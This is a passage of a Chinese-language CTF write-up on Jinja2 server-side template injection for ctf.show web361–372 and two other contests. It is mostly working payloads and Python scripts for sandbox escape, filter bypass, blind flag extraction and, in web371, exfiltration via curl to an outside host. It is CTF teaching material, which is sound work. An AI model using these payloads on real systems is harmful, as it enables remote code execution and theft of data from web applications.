/&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>2.另一种方法：</p><p>找os._wrap_close类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"></span><br><span class="line">for i in tqdm(range(233)):</span><br><span class="line">    url = &#x27;http://9f7c273f-592e-4f44-bec2-fcc399bdf13a.challenge.ctf.show/?name=&#123;&#123;[].__class__.__base__.__subclasses__()[&#x27; + str(</span><br><span class="line">        i) + &#x27;]&#125;&#125;&#x27;</span><br><span class="line">    r = requests.get(url=url).text</span><br><span class="line">    if (&#x27;os._wrap_close&#x27; in r):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure><p>输出132</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p>其中能看到popen，于是利用其来执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>lipsum</strong> 和 cycler 执行命令(不需要索引)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(&#x27;ls /&#x27;).read()&#125;&#125;  也行</span><br></pre></td></tr></table></figure><h2 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h2><p>同上一题第一三种方法，或者第二种方法中数字改为全角数字</p><h2 id="web363-过滤引号-“-‘"><a href="#web363-过滤引号-“-‘" class="headerlink" title="web363(过滤引号) “ ‘"></a>web363(过滤引号) “ ‘</h2><p>1.通过<strong>request.args</strong>的get传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;cycler.__init__.__globals__.os.popen(request.args.a).read()&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure><p><strong>2. 也通过request.form的post传参</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;cycler.__init__.__globals__.os.popen(request.form.cmd).read()&#125;&#125;</span><br><span class="line">post传：cmd=cat /flag</span><br></pre></td></tr></table></figure><p>3.chr拼接</p><p>其实就是将被单引号笼罩的字符换为ascii值,然后用+（%2b)连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;cycler.__init__.__globals__.os.popen(chr(108)%2bchr(115)%2bchr(32)%2bchr(47)).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>4.还可以使用cookies传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;cycler.__init__.__globals__.os.popen(request.cookies.cmd).read()&#125;&#125;</span><br><span class="line">cookie传：cmd=cat /flag</span><br></pre></td></tr></table></figure><h2 id="364-过滤args-”-‘"><a href="#364-过滤args-”-‘" class="headerlink" title="364.过滤args,” ‘"></a>364.过滤args,” ‘</h2><p><code>values</code> 可以获取所有参数，从而绕过 args<br>366.过滤[],args “ ‘ _（attr方法）</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</span><br></pre></td></tr></table></figure><h2 id="367-过滤-args-os"><a href="#367-过滤-args-os" class="headerlink" title="367.过滤[],args &quot; &#39; _ os"></a>367.<code>过滤[],args &quot; &#39; _ os</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;c=cat%20/flag&amp;b=os</span><br></pre></td></tr></table></figure><h2 id="368-过滤-args-os"><a href="#368-过滤-args-os" class="headerlink" title="368.过滤[],args &quot; &#39; _ os{"></a>368.<code>过滤[],args &quot; &#39; _ os&#123;</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print绕过或者表情😈绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%&#125;&amp;a=__globals__&amp;c=cat%20/flag&amp;b=os</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**方法二：&#123;%%&#125;盲注**</span><br></pre></td></tr></table></figure><p>原理</p><blockquote><p><code>open(&#39;/flag&#39;).read()</code>是回显整个文件，但是read函数里加上参数：<code>open(&#39;/flag&#39;).read(1)</code>，返回的就是读出所读的文件里的i个字符，以此类推，就可以盲注出了</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># anthor:秀儿</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://3db27dbc-dccc-46d0-bc78-eff3fc21af74.chall.ctf.show:8080/&quot;</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in &quot;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&quot;:</span><br><span class="line">        params=&#123;</span><br><span class="line"></span><br><span class="line">            &#x27;name&#x27;:&quot;&#123;</span><br><span class="line">   &#123;% set a=(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read(&#123;&#125;) %&#125;&#125;&#123;</span><br><span class="line">   &#123;% if a==request.values.d %&#125;&#125;feng&#123;</span><br><span class="line">   &#123;% endif %&#125;&#125;&quot;.format(i),</span><br><span class="line">            &#x27;a&#x27;:&#x27;__globals__&#x27;,</span><br><span class="line">            &#x27;b&#x27;:&#x27;__builtins__&#x27;,</span><br><span class="line">            &#x27;c&#x27;:&#x27;/flag&#x27;,</span><br><span class="line">            &#x27;d&#x27;:f&#x27;&#123;flag+j&#125;&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.get(url=url,params=params)</span><br><span class="line">        if &quot;feng&quot; in r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            if j==&quot;&#125;&quot;:</span><br><span class="line">                exit()</span><br><span class="line">            break</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意name那里用了<code>&#123; &#123;和&#125;&#125;</code>，这是因为我用的format格式化字符串，用<code>&#123;&#125;</code>来占位，如果里面本来就有<code>&#123;</code>和<code>&#125;</code>的话，就需要用<code>&#123; &#123;</code>和<code>&#125;&#125;</code>来代替<code>&#123;</code>和<code>&#125;</code></p><h2 id="369-过滤"><a href="#369-过滤" class="headerlink" title="369.过滤"></a>369.过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[],args &quot; &#x27; _ os &#123;&#123; request</span><br></pre></td></tr></table></figure><p><strong>方法一：字符串拼接</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># anthor:秀儿</span><br><span class="line">import requests</span><br><span class="line">url=&quot;http://ac6e1d67-01fa-414d-8622-ab71706a7dca.chall.ctf.show:8080/?name=&#123;</span><br><span class="line">   &#123;% print (config|string|list).pop(&#123;&#125;).lower() %&#125;&#125;&quot;</span><br><span class="line"></span><br><span class="line">payload=&quot;cat /flag&quot;</span><br><span class="line">result=&quot;&quot;</span><br><span class="line">for j in payload:</span><br><span class="line">    for i in range(0,1000):</span><br><span class="line">        r=requests.get(url=url.format(i))</span><br><span class="line">        location=r.text.find(&quot;&lt;h3&gt;&quot;)</span><br><span class="line">        word=r.text[location+4:location+5]</span><br><span class="line">        if word==j.lower():</span><br><span class="line">            print(&quot;(config|string|list).pop(%d).lower() == %s&quot;%(i,j))</span><br><span class="line">            result+=&quot;(config|string|list).pop(%d).lower()~&quot;%(i)</span><br><span class="line">            break</span><br><span class="line">print(result[:len(result)-1])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()</span><br><span class="line">)).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() %&#125;</span><br></pre></td></tr></table></figure><p><strong>方法二：替换字符</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% set a=(()|select|string|list).pop(24) %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set init=(a,a,dict(init=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set a=(lipsum|attr(globals)).get(builtins) %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set chr=a.chr %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lipsum.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 在__builtins__里面拿到chr，同样可以很方便的构造字符</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="370-过滤"><a href="#370-过滤" class="headerlink" title="370.过滤"></a>370.过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[],args &quot; &#x27; _ os &#123;&#123; request 数字</span><br></pre></td></tr></table></figure><p>用全角数字代替数字，下面是转换程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def half2full(half):</span><br><span class="line">    full = &#x27;&#x27;</span><br><span class="line">    for ch in half:</span><br><span class="line">        if ord(ch) in range(33, 127):</span><br><span class="line">            ch = chr(ord(ch) + 0xfee0)</span><br><span class="line">        elif ord(ch) == 32:</span><br><span class="line">            ch = chr(0x3000)</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">        full += ch</span><br><span class="line">    return full</span><br><span class="line">while 1:</span><br><span class="line">    t = &#x27;&#x27;</span><br><span class="line">    s = input(&quot;输入想要转换的数字字符串：&quot;)</span><br><span class="line">    for i in s:</span><br><span class="line">        t += half2full(i)</span><br><span class="line">    print(t)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% set po=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list)|attr(po)(２４)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% set chr=x.chr%&#125;</span><br><span class="line">&#123;% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%&#125;</span><br><span class="line">&#123;%print(x.open(file).read())%&#125;</span><br></pre></td></tr></table></figure><h2 id="web371-无回显"><a href="#web371-无回显" class="headerlink" title="web371-无回显"></a>web371-无回显</h2><p>过滤 print 关键字，flag 不会回显，可以用curl命令将flag带出来，最后这两道题用到的数字范围为可见字符的 ascii 码值，所以将0-9构造出来进行拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set e=dict(a=a)|join|count%&#125;</span><br><span class="line">&#123;%set ee=dict(aa=a)|join|count%&#125;</span><br><span class="line">&#123;%set eee=dict(aaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set eeee=dict(aaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set eeeee=dict(aaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set eeeeee=dict(aaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set eeeeeee=dict(aaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set eeeeeeee=dict(aaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set eeeeeeeee=dict(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set eeeeeeeeee=dict(aaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set x=(()|select|string|list).pop((ee~eeee)|int)%&#125;</span><br><span class="line">&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;</span><br><span class="line">&#123;%set builtins=x~x~(dict(builtins=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set import=x~x~(dict(import=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set c = dict(chr=a)|join%&#125;</span><br><span class="line">&#123;%set o = dict(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%set getitem = x~x~(dict(getitem=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%&#125;</span><br><span class="line">&#123;%set zero=chr((eeee~eeeeeeee)|int)%&#125;</span><br><span class="line">&#123;%set cmd = </span><br><span class="line">%&#125;</span><br><span class="line">&#123;%if (lipsum|attr(glob)|attr(getitem)(builtins)).eval(cmd)%&#125;</span><br><span class="line">eastjun</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用命令生成脚本写一个<code>__import__(&#39;os&#39;).system(&#39;curl eastjun.top?</code>cat &#x2F;flag<code>&#39;)</code>到cmd的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">def filting(s):</span><br><span class="line">    return &quot;&quot;.join([f&quot;chr(&#123;ord(i)&#125;)~&quot; for i in s])[:-1]</span><br><span class="line">cmd=filting(&quot;curl https://eastjun.top?flag=`cat /flag`&quot;)</span><br><span class="line">nums = set(re.findall(&quot;(\d+)&quot;,cmd))</span><br><span class="line">for i in nums:</span><br><span class="line">    patnum = &quot;&quot;.join([&quot;zero~&quot; if j==&quot;0&quot; else f&#x27;&#123;&quot;e&quot; * int(j)&#125;~&#x27; for j in f&quot;&#123;i&#125;&quot;])</span><br><span class="line">    cmd = cmd.replace(f&quot;&#123;i&#125;&quot;,f&quot;(&#123;patnum[:-1]&#125;)|int&quot;)</span><br><span class="line">print(cmd)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web372-无回显过滤count"><a href="#web372-无回显过滤count" class="headerlink" title="web372-无回显过滤count"></a>web372-无回显过滤count</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set e=dict(a=a)|join|length%&#125;</span><br><span class="line">&#123;%set ee=dict(aa=a)|join|length%&#125;</span><br><span class="line">&#123;%set eee=dict(aaa=a)|join|length%&#125;</span><br><span class="line">&#123;%set eeee=dict(aaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%set eeeee=dict(aaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%set eeeeee=dict(aaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%set eeeeeee=dict(aaaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%set eeeeeeee=dict(aaaaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%set eeeeeeeee=dict(aaaaaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%set eeeeeeeeee=dict(aaaaaaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%set x=(()|select|string|list).pop((ee~eeee)|int)%&#125;</span><br><span class="line">&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;</span><br><span class="line">&#123;%set builtins=x~x~(dict(builtins=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set import=x~x~(dict(import=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set c = dict(chr=a)|join%&#125;</span><br><span class="line">&#123;%set o = dict(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%set getitem = x~x~(dict(getitem=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%&#125;</span><br><span class="line">&#123;%set zero=chr((eeee~eeeeeeee)|int)%&#125;</span><br><span class="line">&#123;%set cmd = </span><br><span class="line">%&#125;</span><br><span class="line">&#123;%if (lipsum|attr(glob)|attr(getitem)(builtins)).eval(cmd)%&#125;</span><br><span class="line">eastjun</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="GHCTF2025upload-SSTI"><a href="#GHCTF2025upload-SSTI" class="headerlink" title="GHCTF2025upload?SSTI!"></a>GHCTF2025upload?SSTI!</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"> @app.route(&#x27;/file/&lt;path:filename&gt;&#x27;)</span><br><span class="line"> def view_file(filename):</span><br><span class="line">    try:</span><br><span class="line">        # 1. </span><br><span class="line">过滤⽂件名        safe_filename = secure_filename(filename)</span><br><span class="line">        if not safe_filename:</span><br><span class="line">            abort(400, description=&quot;</span><br><span class="line">⽆效⽂件名</span><br><span class="line">&quot;)</span><br><span class="line"></span><br><span class="line">        # 2. </span><br><span class="line">构造完整路径        file_path = os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], safe_filenam</span><br><span class="line"> e)</span><br><span class="line"></span><br><span class="line">        # 3. </span><br><span class="line">路径安全检查        if not is_safe_path(app.config[&#x27;UPLOAD_FOLDER&#x27;], file_path):</span><br><span class="line">            abort(403, description=&quot;</span><br><span class="line">禁⽌访问的路径</span><br><span class="line">&quot;)</span><br><span class="line"></span><br><span class="line">        # 4. </span><br><span class="line">检查⽂件是否存在        if not os.path.isfile(file_path):</span><br><span class="line">            abort(404, description=&quot;</span><br><span class="line">⽂件不存在</span><br><span class="line">&quot;)</span><br><span class="line"></span><br><span class="line">        suffix=os.path.splitext(filename)[1]</span><br><span class="line">        print(suffix)</span><br><span class="line">        if suffix==&quot;.jpg&quot; or suffix==&quot;.png&quot; or suffix==&quot;.gif&quot;:</span><br><span class="line">            return send_from_directory(&quot;static/uploads/&quot;,filename,mimetype</span><br><span class="line"> =&#x27;image/jpeg&#x27;)</span><br><span class="line"></span><br><span class="line">        if contains_dangerous_keywords(file_path):</span><br><span class="line">            # </span><br><span class="line">删除不安全的⽂件            os.remove(file_path)</span><br><span class="line">            return jsonify(&#123;&quot;error&quot;: &quot;Waf!!!!&quot;&#125;), 400</span><br><span class="line"></span><br><span class="line">        with open(file_path, &#x27;rb&#x27;) as f:</span><br><span class="line">            file_data = f.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">        tmp_str = &quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span><br><span class="line">        &lt;html lang=&quot;zh&quot;&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-sca</span><br><span class="line"> le=1.0&quot;&gt;</span><br><span class="line">            &lt;title&gt;查看⽂件内容&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">            &lt;h1&gt;</span><br><span class="line">⽂件内容：</span><br><span class="line">&#123;name&#125;&lt;/h1&gt;  &lt;!-- </span><br><span class="line">显示⽂件名</span><br><span class="line"> --&gt;</span><br><span class="line">            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- </span><br><span class="line">显示⽂件内容</span><br><span class="line"> --&gt;</span><br><span class="line"></span><br><span class="line">            &lt;footer&gt;</span><br><span class="line">                &lt;p&gt;© 2025 </span><br><span class="line">⽂件查看器</span><br><span class="line">&lt;/p&gt;</span><br><span class="line"> &lt;/footer&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br><span class="line">        &quot;&quot;&quot;.format(name=safe_filename, data=file_data)</span><br><span class="line"></span><br><span class="line">        return render_template_string(tmp_str)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        app.logger.error(f&quot;</span><br><span class="line">⽂件查看失败</span><br><span class="line">: &#123;str(e)&#125;&quot;)</span><br><span class="line">        abort(500, description=&quot;</span><br><span class="line">⽂件查看失败</span><br><span class="line">:&#123;&#125; &quot;.format(str(e)))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ssti漏洞"><a href="#ssti漏洞" class="headerlink" title="ssti漏洞"></a>ssti漏洞</h3><p>代码是直接将⽂件内容读取出来然后拼接到模板中，然后利⽤render_template_string来直接渲染模板，这就很明显存在⼀个ssti的漏洞 对⽂件读取的内容有⼀个简单的检测</p><p>且如果是⽂本经拼接到tmp_str中如果是，照⽚就直接返回。所以我们要上传⽂本⽂件 waf很好绕，编码，request啥的都可以</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[request.args.x1][request.args.x2][0][request.args.x3]()[137][request.a</span><br><span class="line"> rgs.x4][request.args.x5][&#x27;popen&#x27;](&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br><span class="line"> ?x1=__class__&amp;x2=__bases__&amp;x3=__subclasses__&amp;x4=__init__&amp;&amp;x5=__globals__</span><br></pre></td></tr></table></figure><h2 id="Basectf-Jinja-Mark"><a href="#Basectf-Jinja-Mark" class="headerlink" title="Basectf Jinja Mark"></a>Basectf Jinja Mark</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BLACKLIST_IN_index = 